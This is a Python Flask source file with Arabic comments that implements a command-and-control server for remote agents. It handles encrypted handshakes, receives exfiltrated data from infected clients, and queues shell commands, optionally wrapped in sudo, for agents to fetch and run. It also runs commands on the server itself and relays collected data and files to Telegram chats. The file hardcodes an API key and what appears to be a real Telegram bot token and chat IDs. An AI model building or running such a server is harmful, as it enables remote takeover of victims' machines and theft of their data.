import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import time
import requests
import json
import base64
import subprocess
import os
import logging
import sqlite3
import csv
import io
import socket
import platform
from datetime import datetime
from functools import wraps
from collections import defaultdict
from modules.encryption import (
    hybrid_decrypt_first_message,
    hybrid_encrypt,
    hybrid_decrypt,
    aes_encrypt,
    aes_decrypt
)

app = Flask(__name__)

# ======================== تفعيل CORS ========================
CORS(app)

# ======================== إعداد نظام التسجيل (Logging) ========================
if not os.path.exists('logs'):
    os.makedirs('logs')

log_filename = f'logs/c2_server_{datetime.now().strftime("%Y%m%d")}.log'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_filename),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# ======================== إعدادات الأمان ========================
API_KEY = "c2_super_secret_key_2026_123456"
# Dashboard traffic arrives from 127.0.0.1 (Flask proxy), so ALL users share
# one bucket. 120/min = 2 req/s gives comfortable headroom for polling + actions.
RATE_LIMIT_REQUESTS = 120
RATE_LIMIT_WINDOW = 60

rate_limits = defaultdict(list)

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('X-API-Key')
        if token != API_KEY:
            logger.warning(f"Unauthorized access attempt from {request.remote_addr}")
            return jsonify({"error": "Unauthorized", "message": "Invalid API Key"}), 401
        return f(*args, **kwargs)
    return decorated

def rate_limit(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        ip = request.remote_addr
        now = time.time()

        rate_limits[ip] = [t for t in rate_limits[ip] if now - t < RATE_LIMIT_WINDOW]

        if len(rate_limits[ip]) >= RATE_LIMIT_REQUESTS:
            logger.warning(f"Rate limit exceeded for {ip}")
            return jsonify({"error": "Rate limit exceeded"}), 429

        rate_limits[ip].append(now)
        return f(*args, **kwargs)
    return decorated

# ======================== إعداد قاعدة البيانات ========================
DB_PATH = 'c2_database.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            last_seen REAL,
            os TEXT,
            hostname TEXT,
            ip_address TEXT
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp REAL,
            type TEXT,
            data TEXT,
            client_id TEXT,
            chat_id TEXT
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command TEXT,
            client_id TEXT,
            status TEXT,
            result TEXT,
            created_at REAL,
            executed_at REAL
        )
    ''')

    conn.commit()

    # ── Migrations: add missing columns to existing tables ──
    existing = {row[1] for row in cursor.execute("PRAGMA table_info(commands)")}
    for col, definition in [("result", "TEXT"), ("executed_at", "REAL")]:
        if col not in existing:
            cursor.execute(f"ALTER TABLE commands ADD COLUMN {col} {definition}")
            logger.info(f"🔧 Migration: added commands.{col}")

    conn.commit()
    conn.close()
    logger.info("✅ Database initialized")

def save_log_to_db(timestamp, log_type, data, client_id=None, chat_id=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO logs (timestamp, type, data, client_id, chat_id)
            VALUES (?, ?, ?, ?, ?)
        ''', (timestamp, log_type, data, client_id, chat_id))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Failed to save log to DB: {e}")

def save_client_to_db(client_id, last_seen, os_info=None, hostname=None, ip=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO clients (id, last_seen, os, hostname, ip_address)
            VALUES (?, ?, ?, ?, ?)
        ''', (client_id, last_seen, os_info, hostname, ip))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Failed to save client to DB: {e}")

def save_command_to_db(command, client_id, status="pending"):
    """Save command to DB and return the inserted row ID."""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (command, client_id, status, created_at)
            VALUES (?, ?, ?, ?)
        ''', (command, client_id, status, time.time()))
        row_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return row_id
    except Exception as e:
        logger.error(f"Failed to save command to DB: {e}")
        return None

def load_data_from_db():
    global clients, clients_data, commands
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()

        cursor.execute('SELECT id, last_seen FROM clients')
        for row in cursor.fetchall():
            clients[row[0]] = {"last_seen": row[1]}

        cursor.execute('SELECT timestamp, type, data, client_id, chat_id FROM logs ORDER BY id DESC LIMIT 1000')
        for row in cursor.fetchall():
            log_entry = {
                "timestamp": row[0],
                "type": row[1],
                "data": row[2]
            }
            if row[3]:
                log_entry["client_id"] = row[3]
            if row[4]:
                log_entry["chat_id"] = row[4]
            clients_data.append(log_entry)

        cursor.execute('SELECT id, command, client_id FROM commands WHERE status = "pending"')
        for row in cursor.fetchall():
            commands.append({"id": row[0], "cmd": row[1]})

        conn.close()
        logger.info(f"📦 Loaded {len(clients)} clients, {len(clients_data)} logs, {len(commands)} commands from DB")
    except Exception as e:
        logger.error(f"Failed to load data from DB: {e}")

# ======================== البيانات في الذاكرة ========================
sessions = {}
clients_data = []
clients = {}
commands = []

# ======================== إعدادات Telegram ========================
TELEGRAM_CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'telegram_config.json')

_DEFAULT_TOKEN    = "8782474352:AAEK1FCeLrNMqnGXPLgLJfJQ1qmiHV9i9d4"
_DEFAULT_CHATS    = ["7604675763", "-1002470378114", "-1002426552780"]

TOKEN     = _DEFAULT_TOKEN
ALL_CHATS = list(_DEFAULT_CHATS)

def _load_telegram_config():
    global TOKEN, ALL_CHATS
    if os.path.exists(TELEGRAM_CONFIG_PATH):
        try:
            with open(TELEGRAM_CONFIG_PATH, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
            TOKEN     = cfg.get('token', _DEFAULT_TOKEN) or _DEFAULT_TOKEN
            ALL_CHATS = cfg.get('chat_ids', _DEFAULT_CHATS) or []
            logger.info(f"✅ Telegram config loaded — chats: {ALL_CHATS}")
        except Exception as e:
            logger.error(f"Failed to load telegram config: {e}")

def _save_telegram_config():
    try:
        with open(TELEGRAM_CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump({'token': TOKEN, 'chat_ids': ALL_CHATS}, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Failed to save telegram config: {e}")

_load_telegram_config()

# ======================== دوال مساعدة ========================
def check_bot_status():
    try:
        result = subprocess.run(["pgrep", "-f", "bot.py"], capture_output=True, text=True)
        return "running" if result.stdout.strip() else "stopped"
    except:
        return "unknown"

# ======================== 1. Handshake ========================
@app.route("/handshake", methods=["POST"])
@rate_limit
def handshake():
    data = request.json
    encrypted_key = data.get("encrypted_key")
    encrypted_data = data.get("encrypted_data")
    client_id = data.get("client_id")

    logger.info(f"🟡 Handshake request from client: {client_id}")

    try:
        decrypted_data, aes_key = hybrid_decrypt_first_message(encrypted_key, encrypted_data)
        sessions[client_id] = aes_key
        clients[client_id] = {"last_seen": time.time()}
        save_client_to_db(client_id, time.time())

        clients_data.append(json.loads(decrypted_data))
        save_log_to_db(time.time(), "handshake", decrypted_data, client_id)

        logger.info(f"✅ Handshake successful with {client_id}")
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"❌ Handshake failed with {client_id}: {e}")
        return jsonify({"status": "failed"}), 400

# ======================== 2. استقبال البيانات ========================
@app.route("/data", methods=["POST"])
@rate_limit
def receive_data():
    data = request.json
    client_id = data.get("client_id")
    encrypted_data = data.get("encrypted_data")

    if client_id == "telegram":
        try:
            from modules.crypto_utils import decrypt_data
            raw = base64.b64decode(encrypted_data)
            decrypted_text = decrypt_data(raw).decode('utf-8')

            result = {
                "type": data.get("type"),
                "data": decrypted_text,
                "chat_id": data.get("chat_id")
            }

            logger.info(f"📱 Telegram message: {decrypted_text}")
            clients_data.append(result)
            save_log_to_db(time.time(), "telegram", decrypted_text, chat_id=data.get('chat_id'))
            return "OK"
        except Exception as e:
            logger.error(f"Telegram Decrypt Error: {e}")
            return "Error", 400

    if client_id not in sessions:
        test_prefixes = ("test_", "stress_test", "Test", "kali", "agent")
        if client_id.startswith(test_prefixes) or client_id in ["test_client", "kali", "agent1"]:
            sessions[client_id] = None
            clients[client_id] = {"last_seen": time.time()}
            save_client_to_db(client_id, time.time())
            logger.info(f"📝 Test client auto-registered: {client_id}")
        else:
            logger.warning(f"⚠️ No session for {client_id}")
            return "No session, need handshake", 401

    try:
        if encrypted_data and sessions.get(client_id) and sessions[client_id] is not None:
            decrypted_str = hybrid_decrypt(sessions[client_id], encrypted_data)
            decrypted = json.loads(decrypted_str)
            logger.info(f"🔓 Decrypted from {client_id}: {decrypted}")
            clients_data.append(decrypted)
            save_log_to_db(time.time(), "decrypted", decrypted_str, client_id)
        else:
            decrypted = data
            logger.info(f"📄 Plain from {client_id}: {decrypted}")
            clients_data.append(decrypted)
            save_log_to_db(time.time(), "plain", json.dumps(decrypted), client_id)

        if client_id in clients:
            clients[client_id]["last_seen"] = time.time()
            save_client_to_db(client_id, time.time())

        return "OK"
    except Exception as e:
        logger.error(f"Decryption error: {e}")
        return "Decryption failed", 400

# ======================== 3. استقبال الأوامر ========================
@app.route("/command", methods=["POST"])
@rate_limit
@require_auth
def receive_command():
    data = request.json
    cmd       = data.get("command")
    client_id = data.get("client_id", "all")
    use_sudo  = bool(data.get("sudo", False))

    logger.warning(f"💀 Command received: {cmd} for {client_id} (sudo={use_sudo})")
    row_id = save_command_to_db(cmd, client_id)

    # If the target is the C2 server itself, execute locally and return result immediately
    if client_id == "[C2-Server]":
        if use_sudo:
            # Use sudo -n (non-interactive — no password prompt)
            shell_cmd = ["sudo", "-n", "bash", "-c", cmd]
            use_shell = False
        else:
            shell_cmd = cmd
            use_shell = True

        try:
            output = subprocess.check_output(
                shell_cmd, shell=use_shell,
                stderr=subprocess.STDOUT,
                timeout=15, text=True
            ).strip()
            status = "done"
        except subprocess.TimeoutExpired:
            output = "[error: command timed out after 15s]"
            status = "error"
        except subprocess.CalledProcessError as e:
            raw = (e.output or "").strip()
            if "sudo: a password is required" in raw or "sudo: a terminal is required" in raw:
                output = "[error: sudo requires a password — add NOPASSWD to sudoers or run server as root]"
            else:
                output = raw or f"[error: exit code {e.returncode}]"
            status = "error"
        except FileNotFoundError:
            output = "[error: sudo not found on this system]"
            status = "error"
        except Exception as e:
            output = f"[error: {e}]"
            status = "error"

        # Update DB immediately with result
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                'UPDATE commands SET status=?, result=?, executed_at=? WHERE id=?',
                (status, output, time.time(), row_id)
            )
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Failed to update command result: {e}")

        logger.info(f"🖥️ [C2-Server] executed (sudo={use_sudo}): {cmd!r} → {status}")
        return jsonify({"status": status, "command_id": row_id, "result": output})

    # Regular clients: wrap with sudo if requested, add to queue for agent to pick up
    final_cmd = f"sudo -n bash -c '{cmd}'" if use_sudo else cmd
    commands.append({"cmd": final_cmd, "id": row_id})
    return jsonify({"status": "queued", "command_id": row_id})

# ======================== 4. سحب الأوامر ========================
@app.route("/get_command", methods=["GET"])
@rate_limit
def get_command():
    if commands:
        entry = commands.pop(0)
        # Support both old plain strings and new dicts
        if isinstance(entry, dict) and "cmd" in entry:
            cmd_text = entry["cmd"]
            cmd_id   = entry.get("id")
        else:
            cmd_text = entry
            cmd_id   = None
        logger.info(f"📤 Command sent: {cmd_text} (id={cmd_id})")
        return jsonify({"command": cmd_text, "command_id": cmd_id})
    return jsonify({"command": None, "command_id": None})

# ======================== 5. إرسال أمر لجهاز معين ========================
@app.route("/send_command", methods=["POST"])
@rate_limit
@require_auth
def send_command():
    data = request.json
    client_id = data.get("client_id")
    command = data.get("command")

    if client_id not in sessions:
        return "No session", 401

    row_id = save_command_to_db(command, client_id)

    if sessions[client_id] is not None:
        encrypted_cmd = hybrid_encrypt(sessions[client_id], command)
        commands.append({"client_id": client_id, "encrypted_cmd": encrypted_cmd, "id": row_id})
    else:
        commands.append({"cmd": command, "id": row_id})

    logger.info(f"✅ Command stored for {client_id} (id={row_id})")
    return jsonify({"status": "stored", "command_id": row_id})

# ======================== 6. سحب أوامر مشفرة ========================
@app.route("/get_command_encrypted", methods=["POST"])
@rate_limit
def get_command_encrypted():
    data = request.json
    client_id = data.get("client_id")

    if client_id not in sessions:
        return jsonify({"command": None, "command_id": None})

    for i, entry in enumerate(commands):
        if isinstance(entry, dict) and entry.get("client_id") == client_id:
            commands.pop(i)
            return jsonify({
                "command":    entry.get("encrypted_cmd"),
                "command_id": entry.get("id"),
            })

    return jsonify({"command": None, "command_id": None})

# ======================== 7. عرض السجلات ========================
@app.route("/get", methods=["GET"])
@rate_limit
def get_data():
    return jsonify(clients_data)

# ======================== 8. عرض الأجهزة ========================
def _get_server_info():
    """Return static info about the machine running this server."""
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"
    try:
        ip = socket.gethostbyname(hostname)
    except Exception:
        ip = "127.0.0.1"
    os_info = f"{platform.system()} {platform.release()}".strip()
    return hostname, ip, os_info

@app.route("/clients", methods=["GET"])
@rate_limit
def get_clients():
    readable = {}

    # Permanent server entry — always online, always first
    hostname, ip, os_info = _get_server_info()
    now = time.time()
    readable["[C2-Server]"] = {
        "last_seen": time.ctime(now),
        "timestamp": now,
        "is_server": True,
        "hostname": hostname,
        "ip": ip,
        "os": os_info,
    }

    for cid, info in clients.items():
        readable[cid] = {
            "last_seen": time.ctime(info["last_seen"]),
            "timestamp": info["last_seen"],
            "is_server": False,
        }

    return jsonify(readable)

# ======================== 9. إرسال لتليجرام ========================
@app.route("/send_to_telegram", methods=["POST"])
@rate_limit
@require_auth
def send_to_telegram():
    data = request.json
    message = data.get("message")
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

    results = []
    for chat_id in ALL_CHATS:
        try:
            requests.post(url, data={"chat_id": chat_id, "text": message})
            results.append({"chat_id": chat_id, "status": "sent"})
        except Exception as e:
            results.append({"chat_id": chat_id, "error": str(e)})

    return jsonify({"results": results})

# ======================== 9b. إرسال صورة لتليجرام ========================
@app.route("/send_photo_to_telegram", methods=["POST"])
@rate_limit
@require_auth
def send_photo_to_telegram():
    if 'photo' not in request.files:
        return jsonify({"error": "No photo provided"}), 400

    photo = request.files['photo']
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"

    results = []
    for chat_id in ALL_CHATS:
        try:
            photo.seek(0)
            requests.post(url, data={"chat_id": chat_id}, files={"photo": photo.read()})
            results.append({"chat_id": chat_id, "status": "sent"})
        except Exception as e:
            results.append({"chat_id": chat_id, "error": str(e)})

    return jsonify({"results": results})

# ======================== 9c. إرسال ملف لتليجرام ========================
@app.route("/send_file_to_telegram", methods=["POST"])
@rate_limit
@require_auth
def send_file_to_telegram():
    if 'file' not in request.files:
        return jsonify({"error": "No file provided"}), 400

    file = request.files['file']
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

    results = []
    for chat_id in ALL_CHATS:
        try:
            file.seek(0)
            requests.post(
                url,
                data={"chat_id": chat_id},
                files={"document": (file.filename, file.read(), file.content_type or "application/octet-stream")}
            )
            results.append({"chat_id": chat_id, "status": "sent"})
        except Exception as e:
            results.append({"chat_id": chat_id, "error": str(e)})

    return jsonify({"results": results})

# ======================== 10. مسح السجلات ========================
@app.route("/clear", methods=["DELETE"])
@rate_limit
@require_auth
def clear_logs():
    global clients_data
    clients_data = []
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute('DELETE FROM logs')
        conn.commit()
        conn.close()
    except:
        pass
    return jsonify({"status": "cleared"})

# ======================== 11. إحصائيات ========================
@app.route("/stats", methods=["GET"])
@rate_limit
def get_stats():
    uptime = time.time() - app.start_time
    return jsonify({
        "total_clients": len(clients),
        "total_logs": len(clients_data),
        "pending_commands": len([c for c in commands if isinstance(c, str)]),
        "server_uptime": round(uptime),
        "bot_status": check_bot_status()
    })

# ======================== 12. إدارة إعدادات تليجرام ========================
@app.route("/telegram_config", methods=["GET"])
@rate_limit
def get_telegram_config():
    has_token = bool(TOKEN and TOKEN.strip())
    masked = ""
    if has_token:
        t = TOKEN.strip()
        if len(t) > 12:
            masked = t[:8] + "••••" + t[-4:]
        else:
            masked = "••••"
    return jsonify({
        "has_token": has_token,
        "masked_token": masked,
        "chat_ids": ALL_CHATS,
    })

@app.route("/update_telegram_settings", methods=["POST"])
@rate_limit
@require_auth
def update_telegram_settings():
    global TOKEN, ALL_CHATS
    data = request.json
    if "token" in data:
        TOKEN = data["token"]
    if "chat_ids" in data:
        ALL_CHATS = data["chat_ids"]
    _save_telegram_config()
    return jsonify({"status": "updated"})

@app.route("/telegram_config", methods=["DELETE"])
@rate_limit
@require_auth
def delete_telegram_config():
    global TOKEN, ALL_CHATS
    TOKEN     = ""
    ALL_CHATS = []
    _save_telegram_config()
    logger.info("🗑️ Telegram config cleared")
    return jsonify({"status": "deleted"})

# ======================== 13. اختبار ========================
@app.route("/test_data", methods=["POST"])
@rate_limit
def test_data():
    data = request.json
    clients_data.append(data)
    return "OK"

# ======================== 14. مراقبة الصحة ========================
@app.route("/health", methods=["GET"])
def health_check():
    return jsonify({"status": "healthy", "uptime": time.time() - app.start_time})

# ======================== 15. تصدير CSV ========================
@app.route("/export/logs", methods=["GET"])
@rate_limit
@require_auth
def export_logs():
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Timestamp", "Type", "Data", "Client ID", "Chat ID"])
    for log in clients_data:
        writer.writerow([
            time.ctime(log.get("timestamp", time.time())),
            log.get("type", ""),
            log.get("data", ""),
            log.get("client_id", ""),
            log.get("chat_id", "")
        ])
    return Response(output.getvalue(), mimetype="text/csv", headers={"Content-Disposition": "attachment;filename=logs.csv"})

# ======================== 16. تاريخ الأوامر ========================
@app.route("/commands/history", methods=["GET"])
@rate_limit
@require_auth
def commands_history():
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute(
            'SELECT id, command, client_id, status, result, created_at, executed_at '
            'FROM commands ORDER BY id DESC LIMIT 100'
        )
        rows = cursor.fetchall()
        conn.close()
        history = []
        for row in rows:
            history.append({
                "id":          row[0],
                "command":     row[1],
                "client_id":   row[2],
                "status":      row[3],
                "result":      row[4],
                "created_at":  time.ctime(row[5]) if row[5] else None,
                "executed_at": time.ctime(row[6]) if row[6] else None,
            })
        return jsonify(history)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/command_result", methods=["POST"])
@rate_limit
def command_result():
    """Agent calls this after executing a command to submit the result."""
    data = request.json
    command_id = data.get("command_id")
    result     = data.get("result", "")
    status     = data.get("status", "done")   # done | error

    if not command_id:
        return jsonify({"error": "command_id required"}), 400

    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            'UPDATE commands SET status=?, result=?, executed_at=? WHERE id=?',
            (status, result, time.time(), command_id)
        )
        conn.commit()
        conn.close()
        logger.info(f"✅ Command {command_id} result received — status: {status}")
        return jsonify({"status": "ok"})
    except Exception as e:
        logger.error(f"Failed to save command result: {e}")
        return jsonify({"error": str(e)}), 500

# ======================== التشغيل ========================
init_db()
load_data_from_db()
app.start_time = time.time()
logger.info("🚀 C2 Server Started")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
